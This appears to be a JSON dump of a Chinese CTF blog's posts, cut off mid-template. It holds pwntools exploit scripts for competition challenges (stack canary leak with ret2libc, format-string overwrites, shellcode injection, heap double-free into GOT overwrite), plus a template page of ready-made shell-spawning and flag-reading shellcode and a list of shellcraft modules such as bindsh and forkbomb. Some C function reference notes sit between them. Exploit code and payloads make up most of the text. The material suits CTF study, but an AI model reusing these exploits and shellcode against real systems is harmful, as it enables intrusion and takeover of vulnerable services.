0x79, 0x6E, 0x94, 0x2C, 0x7E, 0x43, 0xC1, 0x39, 0xA4, 0x5A, 0x52,\n        0x17, 0x78, 0x6E, 0x94, 0x1D, 0x6C, 0x2B, 0x88, 0x1D, 0x9D, 0x42, 0x7d\n    };\n\n    int v6=114514;\n    for( int i=27;i>=0;i--)\n    {\n        miwen[i]-=v6 *((i+1) % 2);\n        miwen[i]=miwen[i]^miwen[i+1];\n    }\n\n    for(int i=0; i<29; i++)\n    {\n        printf(\"%c\",miwen[i]);\n    }\n}\n\n```\n\n最后没完全解密，不过只缺了开头三个字母，按照惯例是fla（g），懒得改了\n\n賏g{U9x_1s_s0_f4nny_1snt_it?}\n\n[点我下载](/downloads_fenzu/babyre.exe)\n","categories":["参赛WP"],"tags":["分组对抗"]},{"title":"西电新生赛WP","url":"/2023/09/21/WP/%E8%A5%BF%E7%94%B5%E6%96%B0%E7%94%9F%E8%B5%9BWP/","content":"\n\n\n水题都没收录，只受有收获的\n\n# canary\n\n```\nfrom pwn import *\nfrom LibcSearcher import *\ncontext.log_level=\"debug\"\nelf=ELF(\"pwn\")\np = remote(\"0.0.0.0\", 33909)\n#p = process(\"./pwn\")\npayload = b'a' * (0x50 - 8) + p8(0xcc)\n\np.sendafter(\"name\", payload)\np.recvuntil(\"\\xcc\")\ncanary = p8(0) + p.recvn(7)\nold_rbp=u64(p.recvuntil('\\x7f')[-6:].ljust(8, b'\\x00'))\nprint(hex(old_rbp))\nprint(canary)\nmain_addr = elf.sym['main']\nvuln=0x00000000040121B\nputs_plt = elf.plt['puts']\nputs_got = elf.got['puts']\npop_rdi_ret = 0x0000000000401343\nret=0x40101a\n\npayload1 = b'a' * 0x48 + canary + p64(old_rbp+0x10) + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(vuln)\n# 给puts函数传入puts的got 得到真实地址 再跳转回main函数便于再次溢出\np.sendlineafter(\"stack!\", payload1)\n\n\nputs_addr = u64(p.recvuntil('\\x7f')[-6:].ljust(8, b'\\x00'))\nprint(hex(puts_addr))\nlibc = LibcSearcher('puts', puts_addr)\nlibc_base = puts_addr - libc.dump('puts')\nsystem_addr = libc_base + libc.dump('system')\nbinsh_addr = libc_base + libc.dump('str_bin_sh')\np.sendlineafter(\"name\",b'1')\npayload2 =b'a' * 0x48 + canary + p64(old_rbp)+p64(pop_rdi_ret)+p64(binsh_addr)+p64(ret)+p64(system_addr)\np.sendlineafter(\"stack\", payload2)\n\np.interactive()\n```\n\n\n\n# fmt3\n\n```\nfrom pwn import *\n\np=remote(\"0\",36043)\n#p=process(\"./format_level3\")\ncontext(log_level = \"debug\",arch = \"i386\",os = \"linux\")\np.sendlineafter(\"Your choice:\",b'3')\n\np.sendlineafter(\"Input what you want to talk:\",b'%14$x')\np.recvuntil(\":\")\np.recvline()\nold_ebp=b'0x'+p.recvline()[:-1]\nold_ebp=int(old_ebp,16)\n\nprint(hex(old_ebp))\n\nret=old_ebp-0xffdaaed8+0xffdaaedc\nsuccess=0x08049317\n#p32(ret)+\"%40c%7$hhn\"   0x4a 0x30 40\n#  8        40\nret_high8=ret%0x100\n\n\n\npayload1=\"%\"+str(ret_high8)+\"c%6$hhn\"\np.sendlineafter(\"Your choice:\",b'3')\np.sendlineafter(\"Input what you want to talk:\",payload1)\n\npayload2=\"%\"+str(success%0x100)+\"c%14$hhn\"\np.sendlineafter(\"Your choice:\",b'3')\np.sendlineafter(\"Input what you want to talk:\",payload2)\n\n\n\npayload1=\"%\"+str(ret_high8+1)+\"c%6$hhn\"\np.sendlineafter(\"Your choice:\",b'3')\np.sendlineafter(\"Input what you want to talk:\",payload1)\n\npayload2=\"%\"+str((success//0x100)%0x100)+\"c%14$hhn\"\np.sendlineafter(\"Your choice:\",b'3')\np.sendlineafter(\"Input what you want to talk:\",payload2)\n\n\n\npayload1=\"%\"+str(ret_high8+2)+\"c%6$hhn\"\np.sendlineafter(\"Your choice:\",b'3')\np.sendlineafter(\"Input what you want to talk:\",payload1)\n\npayload2=\"%\"+str((success//0x100//0x100)%0x100)+\"c%14$hhn\"\np.sendlineafter(\"Your choice:\",b'3')\np.sendlineafter(\"Input what you want to talk:\",payload2)\n\n\n\npayload1=\"%\"+str(ret_high8+3)+\"c%6$hhn\"\np.sendlineafter(\"Your choice:\",b'3')\np.sendlineafter(\"Input what you want to talk:\",payload1)\n\npayload2=\"%\"+str((success//0x100//0x100//0x100)%0x100)+\"c%14$hhn\"\np.sendlineafter(\"Your choice:\",b'3')\n#attach(p)\np.sendlineafter(\"Input what you want to talk:\",payload2)\n\npayload1=\"%\"+str(ret_high8-4)+\"c%6$hhn\"\np.sendlineafter(\"Your choice:\",b'3')\nattach(p)\np.sendlineafter(\"Input what you want to talk:\",payload1)\n\n\n\np.sendlineafter(\"Your choice:\",b'4')\n\np.interactive()\n```\n\n# 验证加法\n\n```\nfrom pwn import *\np = remote(\"0.0.0.0\",38073)\nfor i in range(100):\n    p.recvuntil(\"The second:\")\n    p.recvline()\n    first =p.recvuntil(\"+\")[:-1]\n    secend =p.recvuntil(\"=\")[:-1]\n    result =p.recvline()\n    if int(result) == int(first)+int(secend):\n        p.sendline(\"BlackBird\")\n    else:\n        p.sendline(\"WingS\")\np.interactive()\n```\n\n# 爆破fd\n\n```\nfrom pwn import *\ncontext.log_level=\"debug\"\nfor i in range(3,1024):\n    p = remote(\"0.0.0.0\", 34063)\n    p.recvuntil(\"Please input its fd:\")\n    p.sendline(str(i))\n    p.recvline()\n    print(p.recvline())\np.interactive()\n```\n\n# 汇编跳转\n\n```\nfrom pwn import *\n\ncontext(log_level = \"debug\",arch = \"amd64\",os = \"linux\")\np = remote(\"0.0.0.0\", 39125)\n#p=process(\"./shellcode_level3\")#4011D6\nshell=p8(0xE9)+p8(0x48)+p8(0xD1)+p8(0xFF)+p8(0xFF)#404089 ->4011D6\n#e9 d1 1d 01 04\np.sendlineafter(\"5 bytes ni neng miao sha wo?\",shell)\n\np.interactive()\n```\n\n# 要命的格式化字符串\n\n```\nfrom pwn import *\n\np=remote(\"0\",37699)\n#p=process(\"./format_level2\")\ncontext(log_level = \"debug\",arch = \"i386\",os = \"linux\")\np.sendlineafter(\"Your choice:\",b'3')\noffset = 7\np.sendlineafter(\"Input what you want to talk:\",b'%14$x')\np.recvuntil(\":\")\np.recvline()\nold_ebp=b'0x'+p.recvline()[:-1]\nold_ebp=int(old_ebp,16)\nprint(old_ebp)\nret=old_ebp+(0xffffd00c-0xffffd008)\nsuccess=0x08049330#0x93 0x3008049317\n#p32(ret)+\"%40c%7$hhn\"   0x4a 0x30 40\n#  8        40\npayload1=p32(ret)+b\"%19c%7$hhn\"\np.sendlineafter(\"Your choice:\",b'3')\n\np.sendlineafter(\"Input what you want to talk:\",payload1)\npayload2=p32(ret+1)+b\"%143c%7$hhn\"\np.sendlineafter(\"Your choice:\",b'3')\n\np.sendlineafter(\"Input what you want to talk:\",payload2)\np.sendlineafter(\"Your choice:\",b'4')\np.interactive()\n```\n\n\n\n# shellcode\n\n```\nfrom pwn import *\n\np=remote(\"0\",43007)\n#p=process(\"./shellcode\")\ncontext(log_level = \"debug\",arch = \"amd64\",os = \"linux\")\n\nshellcode='''\nadd     rax,0x21\nmov     byte ptr [rax], 0xf\nadd     rax,1\nmov     byte ptr [rax], 0x5\nxor    rsi,   rsi          \npush   rsi             \nmov     rdi,rsp\nadd     rdi,0x29\nmov    rax,59       \ncdq                \n\n'''\n\n#p=process(\"./format_level2\")\npayload=asm(shellcode)+b'/bin/sh'\nattach(p)\np.sendafter(\"shellcode:\",payload)\n\np.interactive()\n```\n\n\n\n# repwn\n\n```\nfrom pwn import *\n\np=remote(\"0\",44853)\n#p=process(\"./rePWNse\")\naction=0x0000000000401296\npop_rdi=0x000000000040168E\np.sendlineafter(\"Input seven single digits:\",b'1')\nsleep(0.1)\np.sendline(b'9')\nsleep(0.1)\np.sendline(b'1')\nsleep(0.1)\np.sendline(b'9')\nsleep(0.1)\np.sendline(b'8')\nsleep(0.1)\np.sendline(b'1')\nsleep(0.1)\np.sendline(b'0')\np.recvline()\np.recvline()\naddr=p.recvline()[-9:-1]\nsh_addr=int(addr,16)\nprint(hex(sh_addr))\npayload=b'a'*0x48+p64(pop_rdi)+p64(sh_addr)+p64(action)\np.sendlineafter(\"What do you want?\",payload)\np.interactive()\n```\n","categories":["参赛WP"]},{"title":"复现das二进制专项","url":"/2023/11/19/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/heshi%E4%B8%8Edas%E4%BA%8C%E8%BF%9B%E5%88%B6%E4%B8%93%E9%A1%B9%E7%9A%84%E9%82%82%E9%80%85%20-%20%E5%89%AF%E6%9C%AC/","content":"\n# 前言\n\n从今年5月入坑pwn至今已有半年，感觉摸到了一些门道了，写点东西规划一下。这里也会更新学习日记。\n\n# 目前已经会的\n\nc，python编程，ida初步使用，fmt的全部，shellcode绕简单的沙箱。栈溢出边调边打，栈迁移，got，libc。堆的uaf，溢出。fastbin，unsorted_bin，2.23，2.27，linux部分命令绕过，摸了pwntools冰山一角。满打满算学了的东西真不多。other_pwn：条件竞争，别的没学。\n\n# 目前已经摸到的盲点\n\n多线程pwn，win_pwn，IoT，tcache，各种house，kernel提权，python_class,c++，vmpwn,iofile\n\nrealloc,unlink,侧信道，ret2dlresolve\n","categories":["shell以外"],"tags":["日记"]},{"title":"复现das二进制专项","url":"/2023/11/19/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/heshi%E4%B8%8Edas%E4%BA%8C%E8%BF%9B%E5%88%B6%E4%B8%93%E9%A1%B9%E7%9A%84%E9%82%82%E9%80%85/","content":"\n# foooood（跟我的题思路一模一样，气死）\n\n```\nfrom pwn import *\ncontext(os='linux',arch='amd64')  #need tmux\ncontext.log_level=\"debug\"\n\n# p = remote(\"node4.buuoj.cn\", 26443)\np = process(\"./pwn\")\np.sendlineafter(\"Give me your name:\", b\"/bin/sh\")\n\np.sendlineafter(\"food:\", b'%9$p^%11$p^')\nlibc_base = int(p.recvuntil(\"^\")[10:-1], 16) - 0x20750 - 240  # __libc_start_main\nstack = int(p.recvuntil(\"^\")[:-1], 16)\ni_addr = stack - 0x7ffc0bd8af08 + 0x7ffc0bd8ae40\none = libc_base + 0x45226\nprint(hex(one))\np.sendlineafter(\"food:\", \"%{}p%11$hn\".format((i_addr - 0x30 + 4) & 0xffff))\n# attach(p)\np.sendlineafter(\"food:\", \"%{}p%37$hhn\".format(1))\n\np.sendlineafter(\"food:\", \"%{}p%11$hn\".format((i_addr - 0x18) & 0xffff))\n# attach(p)\np.sendlineafter(\"food:\", \"%{}p%37$hn\".format(one & 0xffff))\n\np.sendlineafter(\"food:\", \"%{}p%11$hn\".format((i_addr - 0x18 + 2) & 0xffff))\n# attach(p)\np.sendlineafter(\"food:\", \"%{}p%37$hhn\".format((one & 0xff0000) // 0x10000))\nfor i in range(8):\n    p.sendlineafter(\"food:\", \"1\")\n# attach(p)\np.sendlineafter(\"food:\", \"1\")\nprint(hex(libc_base))\np.interactive()\n```\n\n另外，居然能循环打印栈，等环境变量FLAG\n\n# easynote（两个大洞，但one不通）\n\nuaf和堆溢出都有做法挺多，后面试试\n\n1.改堆指针表，写free_got，free一个“/bin/sh”(我的exp)\n\n2.reaclloc调栈，跳malloc_hook的one\n\n3.unlinlk\n\n```\nfrom pwn import *\n\ncontext(arch='i386', log_level='debug', os='linux')\nelf=ELF(\"./pwn\")\n\n\ndef malloc(size, contet):\n    p.sendlineafter(\"5. exit\", b'1')\n    p.sendlineafter(\"--->\", str(size))\n    p.sendafter(\"--->\", contet)\ndef free(id):\n    p.sendlineafter(\"5. exit\", b'3')\n    p.sendlineafter(\"--->\", str(id))\n\ndef edit(id,size,contet):\n    p.sendlineafter(\"5. exit\", b'2')\n    p.sendlineafter(\"--->\", str(id))\n    p.sendlineafter(\"--->\", str(size))\n    p.sendafter(\"--->\", contet)\n\ndef show(id):\n    p.sendlineafter(\"5. exit\", b'4')\n    p.sendlineafter(\"--->\", str(id))\n\n\n# p = process('./pwn')\np = remote('node4.buuoj.cn', 26517)\nlibc = ELF('libc-2.23.so')\nmalloc(0x80, b'qwer')\nmalloc(0x80, b'qwer')\nmalloc(0x68, b'qwer')\nmalloc(0x68, b'qwer')\nmalloc(0x68, b'/bin/sh')\n\nfree(0)\nshow(0)\np.recvuntil(\":\")\nlibc_base = u64(p.recv(7)[1:] + b'\\0' * 2) - 0x7fef613c4b78 + 0x7fef61000000\nsystem = libc_base + libc.sym[\"system\"]\nfree_got = elf.got['free']\n# pause()\nfree(2)\nfree(3)\nfree(2)\nmalloc(0x68, p64(0x0000000006020C0 - 0x23))\nmalloc(0x68, 'ase')\nmalloc(0x68, 'ase')\nprint(hex(libc_base))\nprint(hex(free_got))\nmalloc(0x68, b'a' * (0x23 - 0x10) + p64(free_got))\n# attach(p)\nedit(0, 10, p64(system))\np.sendlineafter(\"5. exit\", b'3')\np.sendlineafter(\"--->\", b'4')\np.interactive()\n```\n","categories":["刷题"],"tags":["DAS"]},{"title":"容易忘的小知识","url":"/2023/09/22/%E5%A4%87%E5%BF%98/%E5%AE%B9%E6%98%93%E5%BF%98%E7%9A%84%E5%B0%8F%E7%9F%A5%E8%AF%86/","content":"\n\n\n# 64位传参顺序\n\n## 6个参数及以内时\n\n参数从左到右加入寄存器时：**rdi，rsi，rdx，rcx，r8，r9**\n\n## 当参数为7个以上时\n\n前6个与前面一样，但后面的依次从起，当参数对齐7个时，参数从左到右加入寄存器时：**rdi，rsi，rdx，rcx，r8，r9**。六个以上的内容加入栈中，即和32位组装一样。\n\n# 函数原型\n\n## open（open64）函数\n\n```\nint open(const char *path, int access, int mode);\n```\n\n 参数解释：\n path：要打开的文件路径和名称。\n access：访问模式，宏定义和含义如下：\n – O_RDONLY（1）：只读打开；\n – O_WRONLY（2）：只写打开；\n – O_RDWR（4）：读写打开；\n 还可选择以下模式与以上3种基本模式相与：\n – O_CREAT（0x0100）创建一个文件并打开；\n – O_TRUNC（0x0200）打开一个已存在的文件并将文件长度设置为0，其他属性保持；\n – O_EXCL（0x0400）未使用；\n – O_APPEND（0x0800）追加打开文件；\n – O_TEXT（0x4000）打开文本文件翻译CR-LF控制字符；\n – O_BINARY（0x8000）打开二进制字符，不作CR-LF翻译；\n mode：该参数仅在access=O_CREAT方式下使用，其取值如下：\n – S_IFMT（0xF000）：文件类型掩码；\n – S_IFDIR（0x4000）：目录；\n – S_IFIFO（0x1000）：FIFO 专用；\n – S_IFCHR（0x2000）：字符专用；\n – S_IFBLK（0x3000）：块专用；\n – S_IFREG（0x8000）：只为0x0000；\n – S_IREAD（0x0100）：可读；\n – S_IWRITE（0x0080）：可写；\n – S_IEXEC（0x0040）：可执行；\n\n## fopen函数\n\n函数原型：\n\n```\n**FILE *fopen(char *filename, char *mode);**\n```\n\n 参数解释：\n – filename：文件名称。\n – mode：打开模式：\n r：只读方式打开一个文本文件（该文件必须存在）；\n r+：可读可写方式打开一个文本文件（该文件必须存在）；\n w：只写方式打开一个文本文件（若文件存在则文件长度清为0，即该文件内容会消失。若文件不存在则建立该文件）；\n w+：可读可写方式创建一个文本文件（若文件存在则文件长度清为零，即该文件内容会消失。若文件不存在则建立该文件）；\n a：追加方式打开一个文本文件（若文件不存在，则会建立该文件，如果文件存在，写入的数据会被加到文件尾，即文件原先的内容会被保留。（EOF符保留））；\n a+：可读可写追加方式打开一个文本文件（若文件不存在，则会建立该文件，如果文件存在，写入的数据会被加到文件尾后，即文件原先的内容会被保留。 （原来的EOF符不保留））；\n rb：只读方式打开一个二进制文件（使用法则同r）；\n rb+：可读可写方式打开一个二进制文件（使用法则同r+）；\n wb：只写方式打开一个二进制文件（使用法则同w）；\n wb+：可读可写方式生成一个二进制文件（使用法则同w+）；\n ab：追加方式打开一个二进制文件（使用法则同a）；\n ab+：可读可写方式追加一个二进制文件（使用法则同a+）；\n 返回参数： 文件顺利打开后，指向该流的文件指针就会被返回。若果文件打开失败则返回NULL，并把错误代码存在errno  中。一般而言，打开文件后会作一些文件读取或写入的动作，若打开文件失败，接下来的读写动作也无法顺利进行，所以在fopen()后请作错误判断及处理。\n\n## 两者的区别\n\n前者属于低级IO，后者是高级IO。  前者返回一个文件描述符，后者返回一个文件指针。  前者无缓冲，后者有缓冲。  前者与 read, write 等配合使用， 后者与 fread, fwrite等配合使用。  后者是在前者的基础上扩充而来的，在大多数情况下，用后者。\n\n## write函数原型\n\n**\n\n```\nssize_t write(int fd, const void *buf, size_t count);\n```\n\n调用该函数时，需要有三个参数，下面简单的介绍下这三个参数的含义。\n\nfd：要操作的文件的文件描述符，通过open函数打开文件时获取。\n\nbuf：指定写入数据对应的缓冲区，可以将需要的写入的内容存放到buf中，再将其写入文件里。\n\ncount：指定写入的字节数，单位是字节。\n\n返回值：如果写操作顺利完成，则会返回写入的字节数；如果返回值为0，则表示未向文件中写入任何字符；如果写入出错，则会返回-1。\n\n### 一般来说\n\nfd=1时标准输出，fd=文件fd时输出到文件\n\n## read函数原型\n\nC语言中，`read`函数是用于从文件描述符中读取数据的函数，其原型如下：\n\n```c\n#include <unistd.h>\n\nssize_t read(int fd, void *buf, size_t count);\n```\n\n`read`函数的参数如下：\n\n1. `fd`：文件描述符，指定要读取的文件或套接字的标识符。\n2. `buf`：指向存储读取数据的缓冲区的指针。\n3. `count`：要读取的最大字节数。\n\n`read`函数的返回值是实际读取的字节数。如果返回值为0，表示已到达文件末尾；如果返回值为-1，表示读取出错。\n\n需要注意的是，`read`函数是一个阻塞函数，当没有数据可读时，它会一直等待直到有数据可读或出现错误。如果需要非阻塞读取数据，可以使用`select`或`poll`等函数进行操作。\n\n### 一般来说\n\nfd=0时标准输入，fd=文件fd时读取文件\n\n### fd描述符\n\n0，1，2 这三个 fd 值已经被赋予特殊含义，分别是标准输入（ STDIN_FILENO ），标准输出（ STDOUT_FILENO ），标准错误（ STDERR_FILENO ）\n\n## puts函数\n\n```c\nint puts(const char *s);\n```\n\n## printf函数\n\nprintf 函数原型为\n\n```\nint printf(const char *fmt, ...)\n```\n\n后面的参数以fmt的内容定\n\n## mprotect函数\n\n```\n#include <unistd.h>   \n#include <sys/mmap.h>   \nint mprotect(const void *start, size_t len, int prot);\n```\n\nmprotect()函数把自start开始的、长度为len的内存区的保护属性修改为prot指定的值。\n\nprot可以取以下几个值，并且可以用“|”将几个属性合起来使用：\n\n1）PROT_READ：表示内存段内的内容可读；\n\n2）PROT_WRITE：表示内存段内的内容可写；\n\n3）PROT_EXEC：表示内存段中的内容可执行；\n\n4）PROT_NONE：表示内存段中的内容根本没法访问。\n\n需要指出的是，锁指定的内存区间必须包含整个内存页（4K）。区间开始的地址start必须是一个内存页的起始地址，并且区间长度len必须是页大小的整数倍。\n\n如果执行成功，则返回0；如果执行失败，则返回-1，并且设置errno变量，说明具体因为什么原因造成调用失败。错误的原因主要有以下几个：\n\n1）EACCES\n\n该内存不能设置为相应权限。这是可能发生的，比如，如果你 mmap(2) 映射一个文件为只读的，接着使用 mprotect() 标志为 PROT_WRITE。\n\n2）EINVAL\n\nstart 不是一个有效的指针，指向的不是某个内存页的开头。\n\n3）ENOMEM\n\n内核内部的结构体无法分配。\n\n4）ENOMEM\n\n进程的地址空间在区间 [start, start+len] 范围内是无效，或者有一个或多个内存页没有映射。\n\n如果调用进程内存访问行为侵犯了这些设置的保护属性，内核会为该进程产生 SIGSEGV （Segmentation fault，段错误）信号，并且终止该进程。\n\n## Memset\n\n```\n void *memset(void *str, int c, size_t n)\n```\n\n 复制字符 c（一个无符号字符）到参数 str 所指向的字符串的前 n 个字符。其返回值是一个指向 str 的指针\n\n## Sprintf\n\n```\nint sprintf(char *str, const char *format, ...) \n```\n\n发送格式化输出到 str 所指向的字符串。\n\n第二第三个参数对应了 printf 的第一第二个参数，只是多了个输出到的位置，以及检查标签个数和参数个数相同。\n\n如果成功，则返回写入的字符总数，不包括字符串追加在字符串末尾的空字符。如果失败，则返回一个负数。\n\n## Strncmp\n\n```\nint strncmp(const char *str1, const char *str2, size_t n)\n```\n\n把 str1 和 str2 进行比较，最多比较前 n 个字节。\n\n这个比较是通过逐个比较ascii码实现的，遇到ascii码不同直接返回\n\n如果返回值 < 0，则表示 str1 小于 str2。\n\n如果返回值 > 0，则表示 str1 大于 str2。\n\n如果返回值 = 0，则表示 str1 等于 str2。\n\n## fgets\n\nfgets函数功能为从指定的流中读取[数据](https://baike.baidu.com/item/数据/33305?fromModule=lemma_inlink)，每次读取一行。其原型为：\n\n```\nchar *fgets(char *str, int n, FILE *stream);\n```\n\n从指定的流 stream 读取一行，并把它存储在 str  所指向的字符串内。当读取 (n-1) 个字符时，或者读取到换行符时，或者到达文件末尾时，它会停止，具体视情况而定。\n\n## scanf()\n\n**原型：** \n\n```\n`int scanf(const char *format, ...);`\n```\n\n","categories":["备忘"]},{"title":"汇编shell模板","url":"/2023/09/26/%E6%A8%A1%E6%9D%BF/shellcode%E6%A8%A1%E6%9D%BF/","content":"\n# 最短shellcode\n\n## i386长度18\n\n```\nb'j\\x0bXSh//shh/bin\\x89\\xe3\\xcd\\x80'\n```\n\n```bash\npush   0xb\npop    eax\npush   ebx\npush   0x68732f2f\npush   0x6e69622f\nmov    ebx,esp\nint    0x80\n```\n\n##  amd64长度22\n\n```\nb'H1\\xf6VH\\xbf/bin//shWT_\\xb0;\\x99\\x0f\\x05'\n```\n\n```bash\nxor \trsi,\trsi\t\t\t\npush\trsi\t\t\t\t\nmov \trdi,\t0x68732f2f6e69622f\t \npush\trdi\npush\trsp\t\t\npop\trdi\t\t\t\t\nmov \tal,\t59\t\t\t\ncdq\t\t\t\t\t\nsyscall\n```\n\n# 沙盒下最短shellcode\n\n## 64位\n\n```\nshellcode='''\n    xor rax, rax   #xor rax,rax是对rax的清零运算操作\n    xor rdi, rdi   #清空rdi寄存器的值\n    xor rsi, rsi   #清空rsi寄存器的值\n    xor rdx, rdx\n    mov rax, 2      #open调用号为2\n    mov rdi, 0x67616c662f2e   #为galf/.为./flag的相反   0x67616c662f2e为/flag的ASCII码的十六进制\n    push rdi\n    mov rdi, rsp\n    syscall   #系统调用前，linux在eax寄存器里写入子功能号，断止处理程序根据eax寄存器的值来判断用户进程申请哪类系统调用。\n\n    mov rdx, 0x100   #sys_read(3,file,0x100)\n    mov rsi, rdi\n    mov rdi, rax\n    mov rax, 0      #read调用号为0,0为文件描述符，即外部输入，例如键盘\n    syscall\n    \n    mov rdi, 1      #sys_write(1,file,0x30)\n    mov rax, 1      #write调用号为1,1为文件描述符，指的是屏幕\n    syscall\n\n'''\n```\n\n## 32位\n\n```python\nshellcode = \"\"\"\n/*open(./flag)*/\npush 0x1010101\nxor dword ptr [esp], 0x1016660\npush 0x6c662f2e\nmov eax,0x5\nmov ebx,esp\nxor ecx,ecx\nint 0x80\n/*read(fd,buf,0x100)*/\nmov ebx,eax\nmov ecx,esp\nmov edx,0x30\nmov eax,0x3\nint 0x80\n/*write(1,buf,0x100)*/\nmov ebx,0x1\nmov eax,0x4\nint 0x80\n\"\"\"\n```\n\n\n# 32位 短字节shellcode --> 21字节\n\\x6a\\x0b\\x58\\x99\\x52\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x31\\xc9\\xcd\\x80\n\n# 32位 纯ascii字符shellcode\nPYIIIIIIIIIIQZVTX30VX4AP0A3HH0A00ABAABTAAQ2AB2BB0BBXP8ACJJISZTK1HMIQBSVCX6MU3K9M7CXVOSC3XS0BHVOBBE9RNLIJC62ZH5X5PS0C0FOE22I2NFOSCRHEP0WQCK9KQ8MK0AA\n\n# 32位 scanf可读取的shellcode\n\\xeb\\x1b\\x5e\\x89\\xf3\\x89\\xf7\\x83\\xc7\\x07\\x29\\xc0\\xaa\\x89\\xf9\\x89\\xf0\\xab\\x89\\xfa\\x29\\xc0\\xab\\xb0\\x08\\x04\\x03\\xcd\\x80\\xe8\\xe0\\xff\\xff\\xff/bin/sh\n\n# 64位 scanf可读取的shellcode 22字节\n\\x48\\x31\\xf6\\x56\\x48\\xbf\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x57\\x54\\x5f\\xb0\\x3b\\x99\\x0f\\x05\n\n# 64位 较短的shellcode  23字节\n\\x48\\x31\\xf6\\x56\\x48\\xbf\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x57\\x54\\x5f\\x6a\\x3b\\x58\\x99\\x0f\\x05\n\n# 64位 纯ascii字符shellcode\nPh0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a070t\n\n# 其他功能的shell（来自shellcraft）\n\n1. `amd64.linux.amd64_to_i386` - AMD64 到 i386 转换\n2. `amd64.linux.bindsh` - 绑定式 Shell\n3. `amd64.linux.cat` - 查看文件内容\n4. `amd64.linux.cat2` - 查看文件内容（第二版本）\n5. `amd64.linux.connect` - 连接指定主机和端口\n6. `amd64.linux.connectstager` - 连接分阶段的指定主机和端口\n7. `amd64.linux.dupio` - 复制输入/输出\n8. `amd64.linux.dupsh` - 复制 Shell\n9. `amd64.linux.echo` - 回显\n10. `amd64.linux.egghunter` - 查找特定标记的代码（\"蛋猎手\"）\n11. `amd64.linux.findpeer` - 查找对等体\n12. `amd64.linux.findpeersh` - 查找对等体（带 Shell）\n13. `amd64.linux.findpeerstager` - 查找对等体（分阶段）\n14. `amd64.linux.forkbomb` - Fork 炸弹\n15. `amd64.linux.forkexit` - Fork 后退出\n16. `amd64.linux.getpid` - 获取当前进程 ID\n17. `amd64.linux.kill` - 终止指定进程\n18. `amd64.linux.killparent` - 终止父进程\n19. `amd64.linux.listen` - 监听指定端口\n20. `amd64.linux.loader` - 加载器\n21. `amd64.linux.loader_append` - 加载器附加\n22. `amd64.linux.membot` - 内存机器人\n23. `amd64.linux.migrate_stack` - 迁移堆栈\n24. `amd64.linux.mmap_rwx` - 映射内存区域为可读可写可执行\n25. `amd64.linux.read` - 读取文件内容\n26. `amd64.linux.read_upto` - 读取文件内容（直到某点）\n27. `amd64.linux.readfile` - 读取文件\n28. `amd64.linux.readinto` - 读取到指定位置\n29. `amd64.linux.readloop` - 循环读取\n30. `amd64.linux.readn` - 读取指定长度\n31. `amd64.linux.readptr` - 读取指针\n32. `amd64.linux.recvsize` - 接收数据并返回大小\n33. `amd64.linux.setregid` - 设置实际和有效的组 ID\n34. `amd64.linux.setresuid` - 设置实际、有效和保存的用户 ID\n35. `amd64.linux.setreuid` - 设置实际和有效的用户 ID\n36. `amd64.linux.sh` - Shell\n37. `amd64.linux.socket` - 创建套接字\n38. `amd64.linux.stage` - 分阶段执行\n39. `amd64.linux.stager` - 阶段执行\n40. `amd64.linux.strace_dos` - 使用strace进行拒绝服务攻击\n41. `amd64.linux.syscall` - 系统调用\n42. `amd64.linux.writeloop` - 循环写入数据\n\n## 示例：（未检验arch的沙箱）\n\n```\n\nfrom pwn import *\ncontext(os='linux',arch='amd64',log_level='debug')\n#p=process(\"./pwn\")\np=remote(\"node.nsctf.cn\",57981)\nshellcode=asm(\"\"\"\n mov rsp,0x101000;\n\"\"\")\nshellcode+=asm(shellcraft.amd64_to_i386())\ncontext.clear()\ncontext.update(arch=\"i386\")\nshellcode+=asm(shellcraft.cat(\"/flag\"))\np.send(shellcode)\np.interactive()\n```\n\n","categories":["模板"],"tags":["shellcode"]},{"title":"堆学习（经典题）","url":"/2023/11/14/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%A0%86%E5%AD%A6%E4%B9%A0%EF%BC%88%E7%BB%8F%E5%85%B8%E9%A2%98%EF%BC%89/","content":"\n# off_by_one\n\n```\nfrom pwn import *\nfrom LibcSearcher import *\ncontext.log_level='debug'\ncontext.arch='amd64'\n\ndef add(size,contet):\n    p.sendafter(\"Your choice :\",b'1')\n    p.sendafter(\"Size of Heap :\",str(size))\n    p.sendafter(\"Content of heap:\",contet)\n\ndef edit(index,contet):\n    p.sendafter(\"Your choice :\",b'2')\n    p.sendafter(\"Index :\",str(index))\n    p.sendafter(\"Content of heap :\",contet)\n\ndef show(index):\n    p.sendafter(\"Your choice :\",b'3')\n    p.sendafter(\"Index :\", str(index))\n\ndef dele(index):\n    p.sendafter(\"Your choice :\",b'4')\n    p.sendlineafter(\"Index :\",str(index))\n\n# p= process(\"./heapcreator\")\np=remote(\"node4.buuoj.cn\",27274)\nadd(0x18,b'a')\nadd(0x10,b'b')\nadd(0x10,b'c')\nadd(0x10,b'/bin/sh')\nedit(0,b'a'*0x18+b'\\x81')\ndele(1)\nadd(0x70,b'a')\nedit(1,0x10*b'b'+p64(0)+p64(0x21)+p64(0x40)+p64(0x000000000602018))\n# attach(p)\nshow(1)\nfree=p.recvuntil(\"\\x7f\")[-6:]+b'\\0'*2\nfree = u64(free)\nprint(hex(free))\nlibc=LibcSearcher(\"free\",free)\nsystem=libc.dump(\"system\")\nprint(libc)\n#attach(p)\nedit(1,p64(system+free-libc.dump(\"free\")))\ndele(3)\np.interactive()\n```\n","categories":["笔记"],"tags":["堆"]},{"title":"heap模板","url":"/2023/09/26/%E6%A8%A1%E6%9D%BF/heap%E6%A8%A1%E6%9D%BF/","content":"\n# double free\n\n```\nfrom pwn import *\n\ncontext(arch='i386', log_level='debug', os='linux')\n\n#p = process('./heap_Double_Free')\np=remote('123.60.135.228', 2056)\n\ndef fulltcache():\n    for i in range(7):\n        malloc(i, b'qwer')\n    for i in range(7):\n        free(i)\n\ndef malloc(id, contet):\n    